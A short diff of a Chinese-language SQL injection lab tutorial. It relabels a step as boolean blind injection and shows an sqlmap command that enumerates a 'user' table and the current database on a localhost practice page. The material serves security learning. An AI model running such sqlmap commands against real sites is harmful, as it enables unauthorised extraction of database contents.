@@ -199,7 +199,7 @@ AND ORD
 如8.php：
 ![输入图片说明](/imgs/2023-05-11/XaApmBcsUXqmvKRE.png)
 
-shi'yo
+使用布尔盲注：
 ```
 /sqlmap.py -u 
 'http://127.0.0.1/sql_injection/8.php?id=1&submit=submit' 
@@ -207,10 +207,11 @@ shi'yo
 -T user --current-db
 ```
 
+
 > Written with [StackEdit中文版](https://stackedit.cn/).
 >
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTkwMjgwMzU4Myw5MDE2MDM3MzgsLTEzMz
+eyJoaXN0b3J5IjpbMjAzNDcwMDIxMCw5MDE2MDM3MzgsLTEzMz
 Y2NjM1MTUsMTYwMjY0NzEwOCwyMDM3NjA5NzAyLDEwNzUzMzc2
 OSwxNzY5MzI2OTgxLDIwMjAxMzAwMjgsMjY0NjQxNjAzLDIxMj
 g1NzMxNjgsLTY2MTE5NDg3NiwtMjIwMTI2MTYwLC04OTc5Njc2
